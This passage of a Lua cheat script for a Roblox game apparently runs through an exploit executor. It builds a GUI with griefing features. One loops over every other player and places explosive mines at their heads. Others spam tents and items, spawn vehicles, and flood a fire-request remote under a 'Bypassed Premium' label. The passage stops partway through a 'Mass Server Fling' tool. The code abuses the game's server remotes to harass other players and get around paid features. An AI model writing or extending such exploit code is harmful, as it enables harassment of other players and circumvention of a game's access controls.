        cleanUpVisualizer()
        isScattering = false
        ScatterMinesBtn.Text = "💣 Scatter Mines: OFF"
        ScatterMinesBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
    end
end)

-- ==========================================
-- 4. 💣 MINE ANNOY ALL (ANTI-LAG WAVE SPAM)
-- ==========================================
local isMineAnnoyActive = false

-- 🔘 The Toggle Button
local MineAnnoyBtn = Instance.new("TextButton")
MineAnnoyBtn.Size = UDim2.new(1, -20, 0, 32)
MineAnnoyBtn.Position = UDim2.new(0, 10, 0, 280) -- Adjust if needed
MineAnnoyBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
MineAnnoyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
MineAnnoyBtn.Font = Enum.Font.SourceSansBold
MineAnnoyBtn.TextSize = 14
MineAnnoyBtn.Text = "💣 Annoy All (Face Mines): OFF"
MineAnnoyBtn.BorderSizePixel = 0
MineAnnoyBtn.Parent = ToolContainer 
Instance.new("UICorner", MineAnnoyBtn).CornerRadius = UDim.new(0, 6)

-- 💥 The Logic
MineAnnoyBtn.MouseButton1Click:Connect(function()
    isMineAnnoyActive = not isMineAnnoyActive
    local Send = getgenv().Send or (getgenv().g and getgenv().g.Send)
    local player = game:GetService("Players").LocalPlayer
    
    if isMineAnnoyActive then
        MineAnnoyBtn.Text = "💣 Annoy All (Face Mines): ON"
        MineAnnoyBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 200) -- Toxic Purple!
        
        task.spawn(function()
            while isMineAnnoyActive do
                -- 🔄 Get a fresh list of players for this wave
                local allPlayers = game:GetService("Players"):GetPlayers()
                
                -- 🌊 THE WAVE: Process players one at a time
                for _, targetPlayer in ipairs(allPlayers) do
                    if not isMineAnnoyActive then break end
                    
                    -- Ensure target is valid, alive, and not us
                    if targetPlayer ~= player and targetPlayer.Character then
                        local head = targetPlayer.Character:FindFirstChild("Head")
                        local char = player.Character
                        local bp = player:FindFirstChild("Backpack")
                        
                        if head and char and bp and Send then
                            -- 1. Ask the server for exactly one mine
                            Send("get_tool", "Explosive")
                            
                            -- 2. Wait up to 0.2s for it to arrive (Prevents overlapping bugs)
                            local currentExp = nil
                            local waitTimer = 0
                            while waitTimer < 0.2 do
                                currentExp = char:FindFirstChild("Explosive") or bp:FindFirstChild("Explosive")
                                if currentExp then break end
                                waitTimer = waitTimer + task.wait(0.01)
                            end
                            
                            -- 3. If we got it, equip and place it!
                            if currentExp then
                                pcall(function() currentExp.Parent = char end)
                                
                                Send("place", head.Position, Vector3.new(0, 1, 0))
                                
                                Send("delete_tool")
                                currentExp:Destroy()
                            end
                        end
                        
                        -- 🛑 CRITICAL ANTI-LAG DELAY:
                        -- This forces the loop to pause for a fraction of a second before targeting the next person.
                        -- It stops your game from freezing and ensures the server processes every single mine.
                        task.wait(0.03)
                    end
                end
                
                -- The wave finished! Wait a moment before starting the next wave.
                task.wait(0.1)
            end
            
            -- Clear hands when turned off
            if Send then Send("delete_tool") end
        end)
    else
        MineAnnoyBtn.Text = "💣 Annoy All (Face Mines): OFF"
        MineAnnoyBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
    end
end)

-- Safety clear if you die
game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function()
    if isMineAnnoyActive then
        isMineAnnoyActive = false
        MineAnnoyBtn.Text = "💣 Annoy All (Face Mines): OFF"
        MineAnnoyBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
    end
end)
-- ==========================================
-- ⛺ DISCO TENTS (DIRECT COLOR INJECTION)
-- ==========================================
local isDiscoTents = false

local DiscoTentsBtn = Instance.new("TextButton")
DiscoTentsBtn.Size = UDim2.new(1, -20, 0, 32)
DiscoTentsBtn.Position = UDim2.new(0, 10, 0, 320) 
DiscoTentsBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
DiscoTentsBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
DiscoTentsBtn.Font = Enum.Font.SourceSansBold
DiscoTentsBtn.TextSize = 14
DiscoTentsBtn.Text = "⛺ Disco Tents (Rainbow): OFF"
DiscoTentsBtn.BorderSizePixel = 0
DiscoTentsBtn.Parent = ToolContainer 
Instance.new("UICorner", DiscoTentsBtn).CornerRadius = UDim.new(0, 6)

DiscoTentsBtn.MouseButton1Click:Connect(function()
    isDiscoTents = not isDiscoTents
    local Send = getgenv().Send or (getgenv().g and getgenv().g.Send)
    
    if isDiscoTents then
        DiscoTentsBtn.Text = "⛺ Disco Tents (Rainbow): ON"
        DiscoTentsBtn.BackgroundColor3 = Color3.fromRGB(255, 100, 150)
        
        task.spawn(function()
            while isDiscoTents do
                local rColor = Color3.new(math.random(), math.random(), math.random())
                
                if Send then
                    local placed = workspace:FindFirstChild("PlacedModels") or workspace:FindFirstChild("ModelsPlaced")
                    if placed then
                        for _, model in ipairs(placed:GetChildren()) do
                            if model.Name == "Tent" then
                                local ownerId = model:GetAttribute("owner_id")
                                if tostring(ownerId) == tostring(game:GetService("Players").LocalPlayer.UserId) then
                                    
                                    local cd = model:FindFirstChild("InteractionClickDetector", true) or model:FindFirstChildWhichIsA("ClickDetector", true)
                                    
                                    task.spawn(function()
                                        -- Brute-force common direct-color remotes (bypasses the phone UI entirely!)
                                        pcall(function() Send("color_placeable", model, rColor) end)
                                        if cd then
                                            pcall(function() Send("interaction", cd, "Color", rColor) end)
                                            pcall(function() Send("interaction", cd, "Apply Color", rColor) end)
                                            pcall(function() Send("interaction", cd, "Paint", rColor) end)
                                        end
                                    end)
                                    
                                end
                            end
                        end
                    end
                end
                
                -- Flashes a new color every 0.3 seconds!
                task.wait(0.3) 
            end
        end)
    else
        DiscoTentsBtn.Text = "⛺ Disco Tents (Rainbow): OFF"
        DiscoTentsBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
    end
end)

-- Safety clear if you die
game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function()
    if isDiscoTents then
        isDiscoTents = false
        DiscoTentsBtn.Text = "⛺ Disco Tents (Rainbow): OFF"
        DiscoTentsBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
    end
end)

-- ==========================================
-- ⛺ TENT TRAIT (SMART TRAIL & AUTO-CLEANUP)
-- ==========================================
local isTentTraitActive = false
local lastTentPos = nil

local TentTraitBtn = Instance.new("TextButton")
TentTraitBtn.Size = UDim2.new(1, -20, 0, 32)
TentTraitBtn.Position = UDim2.new(0, 10, 0, 360) -- Placed directly below Disco Tents
TentTraitBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
TentTraitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
TentTraitBtn.Font = Enum.Font.SourceSansBold
TentTraitBtn.TextSize = 14
TentTraitBtn.Text = "⛺ Tent Trait (Trail): OFF"
TentTraitBtn.BorderSizePixel = 0
TentTraitBtn.Parent = ToolContainer 
Instance.new("UICorner", TentTraitBtn).CornerRadius = UDim.new(0, 6)

TentTraitBtn.MouseButton1Click:Connect(function()
    isTentTraitActive = not isTentTraitActive
    local Get = getgenv().Get or (getgenv().g and getgenv().g.Get)
    local Send = getgenv().Send or (getgenv().g and getgenv().g.Send)
    local myPlayer = game:GetService("Players").LocalPlayer
    
    if isTentTraitActive then
        TentTraitBtn.Text = "⛺ Tent Trait (Trail): ON"
        TentTraitBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
        lastTentPos = nil
        
        task.spawn(function()
            while isTentTraitActive do
                local char = myPlayer.Character
                local hrp = char and char:FindFirstChild("HumanoidRootPart")
                local RS = game:GetService("ReplicatedStorage")
                local tentModel = RS:FindFirstChild("LargePlaceables") and RS.LargePlaceables:FindFirstChild("Tent")
                
                if hrp and Get and Send and tentModel then
                    local placed = workspace:FindFirstChild("PlacedModels") or workspace:FindFirstChild("ModelsPlaced")
                    local myTentsCount = 0
                    
                    -- 1. SAFETY CLEANUP: Delete tents before they get stuck outside 50 studs
                    if placed then
                        for _, model in ipairs(placed:GetChildren()) do
                            if model.Name == "Tent" then
                                local ownerId = model:GetAttribute("owner_id")
                                if tostring(ownerId) == tostring(myPlayer.UserId) then
                                    myTentsCount = myTentsCount + 1
                                    
                                    local dist = (model:GetPivot().Position - hrp.Position).Magnitude
                                    
                                    -- If it gets 40 studs away, pick it up IMMEDIATELY before it breaks
                                    if dist > 50 then
                                        task.spawn(function()
                                            local cd = model:FindFirstChildWhichIsA("ClickDetector", true) or Instance.new("ClickDetector")
                                            pcall(function() Send("interaction", cd, "Pick Up") end)
                                        end)
                                    end
                                end
                            end
                        end
                    end
                    
                    -- 2. SPAWN TRAIL: Only spawn if we moved far enough from the last tent
                    -- Limits to 18 tents max so you never hit the 21 hard-limit and break your game
                    if myTentsCount < 18 then
                        if not lastTentPos or (hrp.Position - lastTentPos).Magnitude > 8 then
                            
                            -- Puts the tent exactly 8 studs behind your character's back
                            local spawnCFrame = hrp.CFrame * CFrame.new(0, -1, 10)
                            local placeCFrame = CFrame.new(spawnCFrame.Position, spawnCFrame.Position + hrp.CFrame.LookVector)
                            
                            task.spawn(function()
                                pcall(function() Get("large_place", tentModel, placeCFrame) end)
                            end)
                            
                            lastTentPos = hrp.Position
                        end
                    end
                end
                
                task.wait(0.15)
            end
            
            -- 3. AUTO-WIPE: Pick up the remaining trail when turned off
            local placed = workspace:FindFirstChild("PlacedModels") or workspace:FindFirstChild("ModelsPlaced")
            if placed and Send then
                for _, model in ipairs(placed:GetChildren()) do
                    if model.Name == "Tent" then
                        local ownerId = model:GetAttribute("owner_id")
                        if tostring(ownerId) == tostring(myPlayer.UserId) then
                            task.spawn(function()
                                local cd = model:FindFirstChildWhichIsA("ClickDetector", true) or Instance.new("ClickDetector")
                                pcall(function() Send("interaction", cd, "Pick Up") end)
                            end)
                        end
                    end
                end
            end
        end)
    else
        TentTraitBtn.Text = "⛺ Tent Trait (Trail): OFF"
        TentTraitBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
    end
end)

-- Safety clear if you die
game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function()
    if isTentTraitActive then
        isTentTraitActive = false
        TentTraitBtn.Text = "⛺ Tent Trait (Trail): OFF"
        TentTraitBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
    end
end)
-- ==========================================
-- ⭕ ITEM CIRCLE (WHEEL TILT & SMART RADIUS)
-- ==========================================
do
    local IC = {
        On = false, LastPos = nil, LastCF = nil, 
        tRad = 15, cRad = 15, 
        tTilt = 0, cTilt = 0, -- 0 = Flat on ground, 90 = Standing up like a wheel
        tick = 0, lastSpawned = "",
        Btn = Instance.new("TextButton", ToolContainer),
        NameBox = Instance.new("TextBox", ToolContainer),
        LimBox = Instance.new("TextBox", ToolContainer),
        ClearBtn = Instance.new("TextButton", ToolContainer),
        Player = game:GetService("Players").LocalPlayer
    }

    IC.Btn.Size = UDim2.new(1, -20, 0, 32)
    IC.Btn.Position = UDim2.new(0, 10, 0, 400) 
    IC.Btn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
    IC.Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    IC.Btn.Font = Enum.Font.SourceSansBold
    IC.Btn.TextSize = 14
    IC.Btn.Text = "⭕ Item Circle: OFF"
    IC.Btn.BorderSizePixel = 0
    Instance.new("UICorner", IC.Btn).CornerRadius = UDim.new(0, 6)

    IC.NameBox.Size = UDim2.new(0.6, -15, 0, 30)
    IC.NameBox.Position = UDim2.new(0, 10, 0, 440)
    IC.NameBox.PlaceholderText = "Item Name (e.g. Tent)"
    IC.NameBox.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
    IC.NameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    IC.NameBox.Font = Enum.Font.SourceSansBold
    IC.NameBox.TextSize = 13
    IC.NameBox.Text = "Tent"
    IC.NameBox.ClearTextOnFocus = false
    Instance.new("UICorner", IC.NameBox).CornerRadius = UDim.new(0, 6)

    IC.LimBox.Size = UDim2.new(0.4, -15, 0, 30)
    IC.LimBox.Position = UDim2.new(0.6, 5, 0, 440)
    IC.LimBox.PlaceholderText = "Max (Limit 21)"
    IC.LimBox.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
    IC.LimBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    IC.LimBox.Font = Enum.Font.SourceSansBold
    IC.LimBox.TextSize = 13
    IC.LimBox.Text = "15"
    IC.LimBox.ClearTextOnFocus = false
    Instance.new("UICorner", IC.LimBox).CornerRadius = UDim.new(0, 6)

    -- Radius Slider
    IC.RadSlider = createSlider(ToolContainer, "Circle Radius Spread", 1, 40, 15, function(val)
        IC.tRad = val
        IC.tick = tick()
    end)
    IC.RadSlider.Position = UDim2.new(0, 10, 0, 480)
    IC.RadSlider.Size = UDim2.new(1, -20, 0, 50)

    -- Tilt Slider (0 = Flat, 90 = Wheel)
    IC.TiltSlider = createSlider(ToolContainer, "Circle Tilt (0=Flat, 90=Wheel)", 0, 180, 0, function(val)
        IC.tTilt = val
        IC.tick = tick()
    end)
    IC.TiltSlider.Position = UDim2.new(0, 10, 0, 530)
    IC.TiltSlider.Size = UDim2.new(1, -20, 0, 50)

    IC.ClearBtn.Size = UDim2.new(1, -20, 0, 32)
    IC.ClearBtn.Position = UDim2.new(0, 10, 0, 590)
    IC.ClearBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
    IC.ClearBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    IC.ClearBtn.Font = Enum.Font.SourceSansBold
    IC.ClearBtn.TextSize = 14
    IC.ClearBtn.Text = "🗑️ Clear Circle Items"
    IC.ClearBtn.BorderSizePixel = 0
    Instance.new("UICorner", IC.ClearBtn).CornerRadius = UDim.new(0, 6)

    local function wipeC()
        local Send = getgenv().Send or (getgenv().g and getgenv().g.Send)
        if not Send then return end
        local tItem = string.lower(IC.NameBox.Text:gsub("%s+", ""))
        local placed = workspace:FindFirstChild("PlacedModels") or workspace:FindFirstChild("ModelsPlaced")
        if placed then
            for _, m in ipairs(placed:GetChildren()) do
                local mName = string.lower(m.Name:gsub("%s+", ""))
                if mName == tItem or mName == IC.lastSpawned or tItem == "" then
                    if tostring(m:GetAttribute("owner_id")) == tostring(IC.Player.UserId) then
                        task.spawn(function()
                            local cd = m:FindFirstChildWhichIsA("ClickDetector", true) or Instance.new("ClickDetector")
                            pcall(function() Send("interaction", cd, "Pick Up") end)
                        end)
                    end
                end
            end
        end
    end

    IC.ClearBtn.MouseButton1Click:Connect(function()
        IC.ClearBtn.Text = "Clearing..."
        wipeC()
        task.wait(1)
        IC.ClearBtn.Text = "🗑️ Clear Circle Items"
    end)

    IC.Btn.MouseButton1Click:Connect(function()
        IC.On = not IC.On
        if IC.On then
            IC.Btn.Text = "⭕ Item Circle: ON"
            IC.Btn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
            IC.LastPos = nil 
        else
            IC.Btn.Text = "⭕ Item Circle: OFF"
            IC.Btn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
            IC.LastPos = nil
        end
    end)
    
    IC.NameBox.FocusLost:Connect(function() IC.LastPos = nil end)
    IC.LimBox.FocusLost:Connect(function() IC.LastPos = nil end)

    IC.Player.CharacterAdded:Connect(function()
        if IC.On then
            IC.On = false
            IC.Btn.Text = "⭕ Item Circle: OFF"
            IC.Btn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
        end
    end)

    task.spawn(function()
        while true do
            task.wait(0.2)
            if IC.On then
                local char = IC.Player.Character
                local hrp = char and char:FindFirstChild("HumanoidRootPart")
                if hrp then
                    local rebuild = false
                    
                    -- Capture flattened facing direction
                    local _, yRot, _ = hrp.CFrame:ToEulerAnglesYXZ()
                    local flatCF = CFrame.new(hrp.Position) * CFrame.Angles(0, yRot, 0)
                    
                    if (IC.cRad ~= IC.tRad or IC.cTilt ~= IC.tTilt) and (tick() - IC.tick) > 0.4 then
                        IC.cRad = IC.tRad
                        IC.cTilt = IC.tTilt
                        IC.LastCF = flatCF
                        rebuild = true
                    end
                    
                    if not IC.LastPos or (hrp.Position - IC.LastPos).Magnitude > 8 then
                        IC.LastPos = hrp.Position
                        IC.LastCF = flatCF
                        rebuild = true
                    end
                    
                    if rebuild then
                        wipeC()
                        task.wait(0.3)
                        
                        local iName = IC.NameBox.Text
                        local lim = math.clamp(tonumber(IC.LimBox.Text) or 15, 1, 21) 
                        
                        if iName ~= "" then
                            IC.lastSpawned = string.lower(iName:gsub("%s+", ""))
                            
                            local RS = game:GetService("ReplicatedStorage")
                            local lModel = nil
                            local lpFolder = RS:FindFirstChild("LargePlaceables")
                            
                            if lpFolder then
                                for _, v in ipairs(lpFolder:GetChildren()) do
                                    if string.lower(v.Name:gsub("%s+", "")) == IC.lastSpawned then
                                        lModel = v
                                        break
                                    end
                                end
                            end
                            
                            local Get = getgenv().Get or (getgenv().g and getgenv().g.Get)
                            local Send = getgenv().Send or (getgenv().g and getgenv().g.Send)
                            
                            for i = 1, lim do
                                local angle = (math.pi * 2 / lim) * i
                                
                                -- 1. Calculate the flat circle around origin
                                local flatOffset = Vector3.new(math.cos(angle) * IC.cRad, 0, math.sin(angle) * IC.cRad)
                                
                                -- 2. Apply tilt (pitch rotation)
                                local tiltedOffset = CFrame.Angles(math.rad(IC.cTilt), 0, 0) * flatOffset
                                
                                -- 3. Transform to world space relative to the player's facing CFrame
                                local targetCF = IC.LastCF * CFrame.new(tiltedOffset)
                                local spawnPos = targetCF.Position
                                
                                task.spawn(function()
                                    if lModel and Get then
                                        -- Make the item point at the center of the circle
                                        pcall(function() Get("large_place", lModel, CFrame.new(spawnPos, IC.LastPos)) end)
                                    elseif Send then
                                        pcall(function() Send("get_tool", iName) end)
                                        task.wait(0.15)
                                        local bp = IC.Player:FindFirstChild("Backpack")
                                        local tool = char:FindFirstChild(iName) or (bp and bp:FindFirstChild(iName))
                                        if tool then
                                            pcall(function() tool.Parent = char; Send("place", spawnPos, Vector3.new(0, 1, 0)); Send("delete_tool") end)
                                        end
                                    end
                                end)
                                task.wait(0.02)
                            end
                        end
                    end
                end
            end
        end
    end)
end

-- ==========================================
-- SMART HOLD EXPANSION CONNECTION
-- ==========================================
applySmartHold(
    ToolMainBtn,    
    ToolContainer,  
    40,             
    640,            
    0.5,              
    function()
        if ToolInput and ToolInput.Text ~= "" then
            local Send = getgenv().Send or (getgenv().g and getgenv().g.Send)
            if Send then pcall(function() Send("get_tool", ToolInput.Text) end) end
        end
    end,
    function(isExpanded)
        if isExpanded then
            ToolMainBtn.Text = "🛠️ Premium Tool Spawner [▲ Options]"
        else
            ToolMainBtn.Text = "🛠️ Premium Tool Spawner (Hold for Options)"
        end
    end
)

-- ==============================================================
-- 🚙 SMART VEHICLE SPAWNER & TANK CARPET BOMBER (Hold for Options)
-- ==============================================================
-- 1. Main Container
local VehContainer = Instance.new("Frame")
VehContainer.Size = UDim2.new(1, -5, 0, 40)
VehContainer.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
VehContainer.BorderSizePixel = 0
VehContainer.ClipsDescendants = true
VehContainer.Parent = ToolsScroll

-- 2. The Main Button (Vehicle Spawner Bar)
local VehMainBtn = Instance.new("TextButton")
VehMainBtn.Size = UDim2.new(1, 0, 0, 40)
VehMainBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
VehMainBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
VehMainBtn.Font = Enum.Font.SourceSansBold
VehMainBtn.TextSize = 16
VehMainBtn.Text = "🚙 Vehicle Spawner (Hold for Options)"
VehMainBtn.BorderSizePixel = 0
VehMainBtn.Parent = VehContainer
Instance.new("UICorner", VehMainBtn).CornerRadius = UDim.new(0, 8)

-- 3. Vehicle Name Input Box
local VehInput = Instance.new("TextBox")
VehInput.Size = UDim2.new(1, -20, 0, 30)
VehInput.Position = UDim2.new(0, 10, 0, 45)
VehInput.PlaceholderText = "Type car name (e.g. Tank, Monster Truck)"
VehInput.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
VehInput.TextColor3 = Color3.fromRGB(255, 255, 255)
VehInput.Font = Enum.Font.SourceSansBold
VehInput.TextSize = 13
VehInput.Text = ""
VehInput.ClearTextOnFocus = false
VehInput.Parent = VehContainer
Instance.new("UICorner", VehInput).CornerRadius = UDim.new(0, 6)

-- 4. Spawn Vehicle Action Button
local SpawnVehBtn = Instance.new("TextButton")
SpawnVehBtn.Size = UDim2.new(1, -20, 0, 32)
SpawnVehBtn.Position = UDim2.new(0, 10, 0, 82)
SpawnVehBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
SpawnVehBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
SpawnVehBtn.Font = Enum.Font.SourceSansBold
SpawnVehBtn.TextSize = 14
SpawnVehBtn.Text = "Spawn Vehicle"
SpawnVehBtn.BorderSizePixel = 0
SpawnVehBtn.Parent = VehContainer
Instance.new("UICorner", SpawnVehBtn).CornerRadius = UDim.new(0, 6)


-- ==========================================
-- VEHICLE SPAWN LOGIC
-- ==========================================
local flamesHubCars = {
    "Magic Carpet", "EClass", "TowTruck", "Bicycle", "Fiat500", "Cayenne", "Jetski", "LuggageScooter",
    "MiniCooper", "GarbageTruck", "EScooter", "Monster Truck", "Yacht", "Stingray", "FireTruck", "VespaPizza",
    "VespaPolice", "F150", "Police SUV", "Chiron", "Humvee", "Wrangler", "Box Van", "Ambulance", "Urus", "Tesla",
    "Cybertruck", "RollsRoyce", "GClass", "SVJ", "MX5", "SF90", "Charger SRT", "Evoque", "IceCream Truck",
    "Vespa", "ATV", "Limo", "Tank", "Smart Car", "Beauford", "SchoolBus", "Sprinter", "GolfKart", "TrackHawk",
    "Helicopter", "SnowPlow", "Camper Van", "SWAT Van"
}

SpawnVehBtn.MouseButton1Click:Connect(function()
    local inputName = string.lower(VehInput.Text:gsub("%s+", ""))
    if inputName == "" then return end

    local foundName = nil
    for _, v in ipairs(flamesHubCars) do
        if string.lower(v:gsub("%s+", "")):find(inputName, 1, true) then
            foundName = v
            break
        end
    end

    local targetVeh = foundName or VehInput.Text 
    local Get = getgenv().Get or (getgenv().g and getgenv().g.Get)
    
    if Get then
        Get("spawn_vehicle", targetVeh)
        SpawnVehBtn.Text = "Spawned: " .. targetVeh
        SpawnVehBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
        task.delay(1.5, function()
            SpawnVehBtn.Text = "Spawn Vehicle"
            SpawnVehBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
        end)
    else
        SpawnVehBtn.Text = "Network Error"
        SpawnVehBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        task.delay(1.5, function()
            SpawnVehBtn.Text = "Spawn Vehicle"
            SpawnVehBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
        end)
    end
end)

-- ==========================================
-- SMART HOLD CONNECTION
-- ==========================================
applySmartHold(
    VehMainBtn,    
    VehContainer,  
    40,             
    165,            -- Expands to 165px to fit the Input, Spawn Btn, and Carpet Bomb Btn
    0.5,              
    function()
        if VehInput.Text ~= "" then
            for _, conn in ipairs(getconnections(SpawnVehBtn.MouseButton1Click)) do
                conn.Function()
            end
        end
    end,
    function(isExpanded)
        if isExpanded then
            VehMainBtn.Text = "🚙 Premium Vehicle Spawner [▲ Options]"
        else
            VehMainBtn.Text = "🚙 Premium Vehicle Spawner (Hold for Options)"
        end
    end
)


-- ========== FE FIRE SPAWNER (Bypassed Premium) ==========
local FireSpawnFrame = Instance.new("Frame")
FireSpawnFrame.Size = UDim2.new(1, -5, 0, 30) -- Starts collapsed
FireSpawnFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
FireSpawnFrame.BorderSizePixel = 0
FireSpawnFrame.ClipsDescendants = true
FireSpawnFrame.Parent = ToolsScroll

local FireToggleBtn = Instance.new("TextButton")
FireToggleBtn.Size = UDim2.new(1, 0, 0, 30)
FireToggleBtn.Text = "  🔥 FE Fire Spawner [ ▼ ]"
FireToggleBtn.TextColor3 = Color3.fromRGB(255, 100, 50)
FireToggleBtn.Font = Enum.Font.SourceSansBold
FireToggleBtn.TextSize = 14
FireToggleBtn.TextXAlignment = Enum.TextXAlignment.Left
FireToggleBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 32)
FireToggleBtn.BorderSizePixel = 0
FireToggleBtn.Parent = FireSpawnFrame

local FireContent = Instance.new("Frame")
FireContent.Size = UDim2.new(1, 0, 1, -30)
FireContent.Position = UDim2.new(0, 0, 0, 30)
FireContent.BackgroundTransparency = 1
FireContent.Visible = false
FireContent.Parent = FireSpawnFrame

local FireInput = Instance.new("TextBox")
FireInput.Size = UDim2.new(1, -20, 0, 30)
FireInput.Position = UDim2.new(0, 10, 0, 10)
FireInput.PlaceholderText = "Enter amount (e.g. 5 or 20)"
FireInput.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
FireInput.TextColor3 = Color3.fromRGB(255, 255, 255)
FireInput.Font = Enum.Font.SourceSansBold
FireInput.TextSize = 14
FireInput.Text = "5"
FireInput.ClearTextOnFocus = false
FireInput.Parent = FireContent
Instance.new("UICorner", FireInput).CornerRadius = UDim.new(0, 6)

local SpawnFireBtn = Instance.new("TextButton")
SpawnFireBtn.Size = UDim2.new(1, -20, 0, 35)
SpawnFireBtn.Position = UDim2.new(0, 10, 0, 50)
SpawnFireBtn.BackgroundColor3 = Color3.fromRGB(200, 80, 40)
SpawnFireBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
SpawnFireBtn.Font = Enum.Font.SourceSansBold
SpawnFireBtn.TextSize = 14
SpawnFireBtn.Text = "Spawn Fire"
SpawnFireBtn.BorderSizePixel = 0
SpawnFireBtn.Parent = FireContent
Instance.new("UICorner", SpawnFireBtn).CornerRadius = UDim.new(0, 6)

-- Dropdown Toggle Logic
local fireExpanded = false
FireToggleBtn.MouseButton1Click:Connect(function()
    fireExpanded = not fireExpanded
    if fireExpanded then
        FireSpawnFrame.Size = UDim2.new(1, -5, 0, 100)
        FireContent.Visible = true
        FireToggleBtn.Text = "  🔥 FE Fire Spawner [ ▲ ]"
    else
        FireSpawnFrame.Size = UDim2.new(1, -5, 0, 30)
        FireContent.Visible = false
        FireToggleBtn.Text = "  🔥 FE Fire Spawner [ ▼ ]"
    end
end)
-- The Bypassed Spawner Logic (Exact Original Mimic)
SpawnFireBtn.MouseButton1Click:Connect(function()
    local amount = tonumber(FireInput.Text) or 5 
    
    -- Find the global network functions
    local g = getgenv().g or getgenv()
    local Send = g.Send

    if Send then
        SpawnFireBtn.Text = "Spawning " .. amount .. " Fires..."
        SpawnFireBtn.BackgroundColor3 = Color3.fromRGB(255, 150, 50)
        
        task.spawn(function()
            -- 1. Mimic the hub's exact pre-fire wait (fw(0.2))
            task.wait(0.2)
            
            -- 2. Attempt to run the hub's specific amount setter if it exists
            pcall(function()
                if type(g.set_fire_amount_FE) == "function" then
                    g.set_fire_amount_FE(amount)
                elseif type(getgenv().set_fire_amount_FE) == "function" then
                    getgenv().set_fire_amount_FE(amount)
                end
            end)
            
            -- 3. Fire all requests instantly on the same frame (No task.wait inside the loop!)
            for i = 1, amount do
                Send("request_fire")
            end
            
            SpawnFireBtn.Text = "Fires Spawned!"
            SpawnFireBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
            task.wait(1.5)
            SpawnFireBtn.Text = "Spawn Fire"
            SpawnFireBtn.BackgroundColor3 = Color3.fromRGB(200, 80, 40)
        end)
    else
        SpawnFireBtn.Text = "Network Error"
        SpawnFireBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        task.wait(1.5)
        SpawnFireBtn.Text = "Spawn Fire"
        SpawnFireBtn.BackgroundColor3 = Color3.fromRGB(200, 80, 40)
    end
end)


-- ========== MASS SERVER FLING (Underground Uppercut + Auto-Respawn & Stack Logs) ==========
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local isMassFlinging = false
local massFlingLoop = nil
local targetCycler = nil
local massFlingTarget = nil
massWhitelist = {}
local originalCarProps = {}

-- Main Container (Adjusted to fit Status Console)
local MassFlingFrame = Instance.new("Frame")
MassFlingFrame.Size = UDim2.new(1, -5, 0, 165)
MassFlingFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
MassFlingFrame.BorderSizePixel = 0
MassFlingFrame.ClipsDescendants = true
MassFlingFrame.Parent = ToolsScroll

local MassFlingTitle = Instance.new("TextLabel")
MassFlingTitle.Size = UDim2.new(1, -10, 0, 20)
MassFlingTitle.Position = UDim2.new(0, 5, 0, 5)
MassFlingTitle.Text = "🚗 Autonomous Server Strike"
MassFlingTitle.TextColor3 = Color3.fromRGB(0, 255, 200)
MassFlingTitle.Font = Enum.Font.SourceSansBold
MassFlingTitle.TextSize = 14
MassFlingTitle.TextXAlignment = Enum.TextXAlignment.Left
MassFlingTitle.BackgroundTransparency = 1
MassFlingTitle.Parent = MassFlingFrame

local MassFlingBtn = Instance.new("TextButton")
MassFlingBtn.Size = UDim2.new(1, -10, 0, 35)
MassFlingBtn.Position = UDim2.new(0, 5, 0, 25)
MassFlingBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
MassFlingBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
MassFlingBtn.Font = Enum.Font.SourceSansBold
MassFlingBtn.TextSize = 16
MassFlingBtn.Text = "START SERVER FLING"
MassFlingBtn.BorderSizePixel = 0
MassFlingBtn.Parent = MassFlingFrame

-- Stacking Status Log Console
local StatusScroll = Instance.new("ScrollingFrame")
StatusScroll.Size = UDim2.new(1, -10, 0, 60)
StatusScroll.Position = UDim2.new(0, 5, 0, 65)
StatusScroll.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
StatusScroll.BorderSizePixel = 0
StatusScroll.ScrollBarThickness = 3
StatusScroll.Parent = MassFlingFrame

